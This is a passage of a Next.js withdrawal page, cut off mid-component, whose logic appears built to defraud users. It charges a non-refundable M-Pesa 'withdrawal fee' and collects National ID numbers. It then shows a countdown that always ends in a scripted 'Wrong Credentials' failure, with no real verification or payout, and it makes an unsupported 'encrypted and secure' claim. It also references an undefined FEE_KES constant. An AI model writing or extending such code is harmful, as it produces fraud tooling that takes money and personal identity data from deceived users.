  // pages/withdraw.js, full-page withdrawals (M-Pesa + Other Countries).
// Replaces the pop-up modals. Submitted requests are emailed automatically to
// the admin with a client auto-reply (via /api/notify), falling back to mailto.
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { useUser } from '../lib/useUser';
import { sendNotify } from '../lib/notify';
import { createWithdrawalRequest } from '../lib/auth';
import { bulkWithdrawalQuote } from '../lib/auth';
import MpesaPay from '../components/MpesaPay';   // Daraja STK is the active withdrawal-fee method (Paystack kept but disabled)
import FlowShell from '../components/FlowShell';
import Icon from '../components/Icon';
import { FlowSkeleton } from '../components/Skeleton';

// Small monochrome country-code badge (replaces flag emojis in the bank picker).
function CodeBadge({ code, size = 20 }) {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      minWidth: size, height: size, padding: '0 4px', borderRadius: 5,
      background: '#111827', color: '#fff', fontSize: Math.round(size * 0.5),
      fontWeight: 700, letterSpacing: 0.3, flexShrink: 0,
    }}>{String(code || '··').toUpperCase()}</span>
  );
}

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const t = Math.floor(ms / 1000);
  return `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
}

// ── Worldwide bank directory (icon, sample account format, validator) ──────────
const COUNTRY_META = {
  GB: { country: 'United Kingdom', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
  DE: { country: 'Germany',        ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
  FR: { country: 'France',         ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
  ES: { country: 'Spain',          ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
  IT: { country: 'Italy',          ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
  NL: { country: 'Netherlands',    ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
  CH: { country: 'Switzerland',    ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
  IE: { country: 'Ireland',        ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
  BE: { country: 'Belgium',        ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
  PT: { country: 'Portugal',       ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
  SE: { country: 'Sweden',         ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
  NO: { country: 'Norway',         ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
  PL: { country: 'Poland',         ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
  AE: { country: 'United Arab Emirates', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
  SA: { country: 'Saudi Arabia',   ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
  BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
  EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
  PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
  KE: { country: 'Kenya',          ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
  MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
  US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
  CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
  NG: { country: 'Nigeria',        ph: '0123456789',             re: /^\d{10}$/ },
  ZA: { country: 'South Africa',   ph: '0123 4567 89',           re: /^\d{9,11}$/ },
  GH: { country: 'Ghana',          ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
  IN: { country: 'India',          ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
  CN: { country: 'China',          ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
  JP: { country: 'Japan',          ph: '1234567',                re: /^\d{7,8}$/ },
  AU: { country: 'Australia',      ph: '0123 4567',              re: /^\d{6,10}$/ },
  SG: { country: 'Singapore',      ph: '012 345678 9',           re: /^\d{9,12}$/ },
  JM: { country: 'Jamaica',        ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
  MX: { country: 'Mexico',         ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
  UG: { country: 'Uganda',          ph: '0123456789', re: /^\d{8,14}$/ },
  SD: { country: 'Sudan',            ph: '0123456789', re: /^\d{8,16}$/ },
  TZ: { country: 'Tanzania',         ph: '0123456789', re: /^\d{8,15}$/ },
  CO: { country: 'Colombia',         ph: '0123456789', re: /^\d{8,16}$/ },
  CL: { country: 'Chile',            ph: '0123456789', re: /^\d{7,16}$/ },
};
const BANKS_BY_COUNTRY = {
  GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
  DE: ['Deutsche Bank', 'Commerzbank', 'DZ Bank'],
  FR: ['BNP Paribas', 'Société Générale', 'Crédit Agricole'],
  ES: ['Banco Santander', 'BBVA', 'CaixaBank', 'Santander'],
  IT: ['UniCredit', 'Intesa Sanpaolo'],
  NL: ['ING Bank', 'Rabobank', 'ABN AMRO'],
  CH: ['UBS', 'Credit Suisse'],
  IE: ['Allied Irish Banks (AIB)', 'Bank of Ireland'],
  BE: ['KBC Bank'],
  PT: ['Millennium BCP'],
  SE: ['Nordea', 'SEB'],
  NO: ['DNB'],
  PL: ['PKO Bank Polski'],
  AE: ['Emirates NBD', 'First Abu Dhabi Bank'],
  SA: ['Al Rajhi Bank', 'Saudi National Bank'],
  BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil', 'Bradesco'],
  EG: ['National Bank of Egypt'],
  PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
  KE: [
    'CB Bank', 'NCBA Bank', 'Postbank Kenya', 'Equity Bank', 'KCB Bank',
    'Co-operative Bank', 'Co-operative Bank of Kenya', 'Absa Bank Kenya',
    'Standard Chartered Bank', 'Stanbic Bank Kenya', 'Family Bank of Kenya', 'DTB Bank'
  ],
  MB: ['Mobile Banking'],
  US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank', 'U.S. Bank', 'PNC Bank', 'Truist Bank', 'Capital One'],
  CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
  NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
  ZA: ['Standard Bank', 'First National Bank (FNB)', 'Absa', 'Capitec', 'Nedbank'],
  GH: ['Ecobank Ghana', 'GCB Bank'],
  IN: ['State Bank of India (SBI)', 'HDFC Bank', 'ICICI Bank', 'Axis Bank'],
  CN: ['ICBC', 'Bank of China', 'China Construction Bank'],
  JP: ['MUFG Bank', 'Sumitomo Mitsui (SMBC)'],
  AU: ['Commonwealth Bank', 'ANZ', 'Westpac', 'NAB'],
  SG: ['DBS Bank', 'OCBC Bank', 'UOB'],
  JM: ['National Commercial Bank (NCB)', 'Scotiabank Jamaica', 'JN Bank'],
  MX: ['BBVA México', 'Banorte', 'Citibanamex'],
  UG: ['Stanbic Bank Uganda', 'Centenary Bank', 'Absa Bank Uganda', 'Bank of Uganda'],
  SD: ['Bank of Khartoum', 'Faisal Islamic Bank', 'Omdurman National Bank'],
  TZ: ['CRDB Bank', 'NMB Bank', 'NBC Bank'],
  CO: ['Banco de Bogotá', 'Bancolombia'],
  CL: ['BCI', 'Banco de Chile'],
};
const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
  names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
).sort((a, b) => a.name.localeCompare(b.name));

// Registration uses full country names; a few differ from the bank directory.
const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };

// Mobile Banking is offered to every user regardless of country.
const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');

// M-Pesa withdrawal processing fee tiers, based on the client's current balance.
// KES 1–5,000 → KES 650
// Above 5,000–10,000 → KES 950
// Above 10,000–25,000 → KES 2,295
function getMpesaWithdrawalFee(balance) {
  const amount = Number(balance || 0);
  if (amount <= 5000) return 650;
  if (amount <= 10000) return 950;
  return 2295;
}

// Bank withdrawal fees are fixed in USD (Option A).
// The exact figures supplied by the client are preserved below. For banks where
// only a range was supplied, a fixed amount inside that range is used so the
// M-Pesa payment can always request one exact amount.
const USD_TO_KES = 135;

const BANK_WITHDRAWAL_FEES_USD = {
  // Kenya — supplied figures
  'CB Bank': 23,
  'NCBA Bank': 27,
  'Co-operative Bank of Kenya': 28,
  'Co-operative Bank': 28,
  'Equity Bank': 25,
  'Absa Bank Kenya': 29,
  'Standard Chartered Bank': 24,
  'Stanbic Bank Kenya': 27,
  'Postbank Kenya': 28,
  'Family Bank of Kenya': 29,
  'DTB Bank': 19,
  'KCB Bank': 26,

  // Uganda / Sudan / Tanzania — supplied ranges converted to fixed fees
  'Stanbic Bank Uganda': 22,
  'Centenary Bank': 11,
  'Absa Bank Uganda': 40,
  'Bank of Uganda': 41,
  'Bank of Khartoum': 42,
  'Faisal Islamic Bank': 43,
  'Omdurman National Bank': 44,
  'CRDB Bank': 45,
  'NMB Bank': 46,
  'NBC Bank': 47,

  // Brazil / Colombia / Chile — supplied ranges converted to fixed fees
  'Banco do Brasil': 48,
  'Itaú Unibanco': 49,
  'Banco Bradesco': 50,
  'Bradesco': 50,
  'Banco Santander': 51,
  'Santander': 51,
  'Banco de Bogotá': 52,
  'Bancolombia': 53,
  'BCI': 54,
  'Banco de Chile': 55,

  // United States — fixed values within the supplied USD 60–86 range
  'JPMorgan Chase': 60,
  'Bank of America': 62,
  'Wells Fargo': 64,
  'Citibank': 66,
  'U.S. Bank': 68,
  'PNC Bank': 70,
  'Truist Bank': 72,
  'Capital One': 74,

  // Other listed banks — fixed fees in the requested USD 40–82 band
  'Barclays Bank': 40.5, 'HSBC UK': 41.5, 'Lloyds Bank': 42.5, 'NatWest': 43.5, 'Standard Chartered': 44.5,
  'Deutsche Bank': 45.5, 'Commerzbank': 46.5, 'DZ Bank': 47.5,
  'BNP Paribas': 48.5, 'Société Générale': 49.5, 'Crédit Agricole': 50.5,
  'BBVA': 52.5, 'CaixaBank': 53.5,
  'UniCredit': 54.5, 'Intesa Sanpaolo': 55.5,
  'ING Bank': 56.5, 'Rabobank': 57.5, 'ABN AMRO': 58.5,
  'UBS': 59.5, 'Credit Suisse': 60.5,
  'Allied Irish Banks (AIB)': 61.5, 'Bank of Ireland': 62.5,
  'KBC Bank': 63.5, 'Millennium BCP': 64.5,
  'Nordea': 65.5, 'SEB': 66.5, 'DNB': 67.5, 'PKO Bank Polski': 68.5,
  'Emirates NBD': 69.5, 'First Abu Dhabi Bank': 70.5,
  'Al Rajhi Bank': 71.5, 'Saudi National Bank': 72.5,
  'National Bank of Egypt': 73.5, 'HBL (Habib Bank)': 74.5, 'United Bank (UBL)': 75.5,
  'RBC Royal Bank': 76.5, 'TD Canada Trust': 77.5, 'Scotiabank': 78.5,
  'Guaranty Trust Bank (GTBank)': 79.5, 'Access Bank': 80.5, 'First Bank of Nigeria': 81, 'Zenith Bank': 81.5,
  'Standard Bank': 40.25, 'First National Bank (FNB)': 41.25, 'Absa': 42.25, 'Capitec': 43.25, 'Nedbank': 44.25,
  'Ecobank Ghana': 45.25, 'GCB Bank': 46.25,
  'State Bank of India (SBI)': 47.25, 'HDFC Bank': 48.25, 'ICICI Bank': 49.25, 'Axis Bank': 50.25,
  'ICBC': 51.25, 'Bank of China': 52.25, 'China Construction Bank': 53.25,
  'MUFG Bank': 54.25, 'Sumitomo Mitsui (SMBC)': 55.25,
  'Commonwealth Bank': 56.25, 'ANZ': 57.25, 'Westpac': 58.25, 'NAB': 59.25,
  'DBS Bank': 60.25, 'OCBC Bank': 61.25, 'UOB': 62.25,
  'National Commercial Bank (NCB)': 63.25, 'Scotiabank Jamaica': 64.25, 'JN Bank': 65.25,
  'BBVA México': 66.25, 'Banorte': 67.25, 'Citibanamex': 68.25,
  'Mobile Banking': 69.25,
};

function getBankWithdrawalFeeUsd(bankName) {
  const fee = BANK_WITHDRAWAL_FEES_USD[bankName];
  return Number.isFinite(Number(fee)) ? Number(fee) : 40;
}

function getBankWithdrawalFeeKes(bankName, rate = USD_TO_KES) {
  return Math.round(getBankWithdrawalFeeUsd(bankName) * Number(rate || USD_TO_KES));
}

// Postbank uses its own bank-specific fee from the map above.
const BANK_FEE_USD = getBankWithdrawalFeeUsd('Postbank Kenya');
const BANK_FEE_KES = getBankWithdrawalFeeKes('Postbank Kenya');


// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
const BULK_THRESHOLD_KES = 25000;

// ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
function MpesaFlow({ user, initialStep, initialFeeRef }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'notice');
  const [phone,    setPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);
  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Paystack fee reference

  // countdown
  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!phone.trim())    errs.phone    = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }

    // Details are collected and validated BEFORE the withdrawal-fee payment.
    // Nothing is submitted to the server until Daraja confirms the fee payment.
    setErrors({});
    setStep('fee');
  }

  async function handleFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setStep('form');
      return;
    }

    const amount = Number(user?.balance || 0);
    setFeeRef(verifiedFeeRef);
    setLoading(true);

    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: user?.fullName || '',
        phone: phone.trim(),
        idNumber: idNumber.trim(),
        amount,
        feeRef: verifiedFeeRef,
        method: 'mpesa',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    setLoading(false);

    if (!res || res.error) {
      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
      setStep('form');
      return;
    }

    await sendNotify({
      type: 'M-Pesa Withdrawal Request',
      name: user?.fullName || '',
      email: user?.email || '',
      phone,
      subject: 'M-Pesa Withdrawal Request',
      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment`,
    });

    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  // A balance strictly above KES 25,000 is a bulk withdrawal.
  // Clicking M-Pesa for a bulk balance redirects directly to the
  // Other Countries / Bulk Withdrawal bank flow.
  useEffect(() => {
    if (Number(user?.balance || 0) > BULK_THRESHOLD_KES) {
      router.replace('/withdraw?method=international&bulk=1');
    }
  }, [router, user?.balance]);

  if (Number(user?.balance || 0) > BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Withdraw with M-Pesa" subtitle="Redirecting to Bulk Withdrawal" icon="smartphone" accent="var(--mpesa-green)">
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>, which is above the M-Pesa limit of <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>.
          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bulk bank withdrawal.
        </div>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
      {step === 'notice' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            <strong style={{ display: 'block', fontSize: 15, marginBottom: 6 }}>Instant M-Pesa Withdrawal</strong>
            Your withdrawal will be processed after verification. Please enter your correct M-Pesa details to avoid delays or failed payouts. Ensure your phone number is registered for M-Pesa before submitting your request.
          </div>
          <div className="pay-amount" style={{ marginBottom: 20 }}>
            <div className="pay-amount-label">Withdrawal Fee</div>
            <div className="pay-amount-value" style={{ color: 'var(--mpesa-green)' }}>KES {FEE_KES.toLocaleString()}</div>
            <div className="pay-amount-sub">A one-time, non-refundable processing fee is paid via M-Pesa before your request is submitted.</div>
          </div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => setStep('fee')}>
            Continue
          </button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
            Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to continue. You&apos;ll get a prompt on your phone, enter your PIN to confirm. The withdrawal form unlocks only after the payment is verified.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={FEE_KES}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handleFeeSuccess}
          />
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
            <Icon name="arrowLeft" size={14} /> Back to Dashboard
          </button>
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20 }}>
            Enter your details accurately. Your National ID must match your M-Pesa registration.
          </div>
          <div className="pay-phone-label">M-Pesa Phone Number</div>
          <input className="pay-phone-input" type="tel" value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f0fff4', marginTop: 16, fontSize: 13 }}>
            ✓ Withdrawal fee of <strong>KES {FEE_KES.toLocaleString()}</strong> paid and verified.
          </div>
          {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: 'var(--mpesa-green)', display: 'flex' }}><Icon name="smartphone" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#1f2937', lineHeight: 1.65 }}>
              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your M-Pesa line active and await the STK push.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
function PostbankFlow({ user, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'choice');
  const [name,     setName]     = useState(user?.fullName || '');
  const [account,  setAccount]  = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);
  const [feePaid,   setFeePaid]  = useState(false);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!name.trim())     errs.name     = 'Account holder name is required';
    if (!account.trim())  errs.account  = 'Postbank account number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }

    // Collect and validate the bank details first. Payment is requested only after
    // the user explicitly submits these details.
    setErrors({});
    setStep('fee');
  }

  async function handlePostbankFeeSuccess() {
    setFeePaid(true);
    setLoading(true);

    await sendNotify({
      type: 'Postbank Kenya Withdrawal Request',
      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Postbank Kenya Withdrawal Request',
      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nFee paid (verified): KES ${BANK_FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });

    setLoading(false);
    setStep('pending');
  }

  const isLow    = remaining < 30 * 1000;
  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
  const accent   = '#000000';
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;

  return (
    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="cash" accent={accent}>
      {step === 'choice' && overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Enter Postbank Details
          </button>
        </>
      )}

      {step === 'choice' && !overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="check" size={16} /> Yes, withdraw with M-Pesa (recommended)
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
            <Icon name="cash" size={16} /> No, I can’t use M-Pesa
          </button>
        </>
      )}

      {step === 'management' && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="smartphone" size={16} /> No, take me to M-Pesa
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Yes, management asked me, enter details
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            Your Postbank withdrawal details have been submitted. Now pay the <strong>KES {BANK_FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={BANK_FEE_KES}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handlePostbankFeeSuccess}
          />
          {loading && (
            <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
              Payment verified. Submitting your withdrawal request…
            </div>
          )}
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
          </div>
          <div className="pay-phone-label">Account Holder Name</div>
          <input className="pay-phone-input" value={name}
            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#4b5563' : undefined }} />
          {errors.name && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
          <input className="pay-phone-input" value={account}
            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#4b5563' : undefined }} />
          {errors.account && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
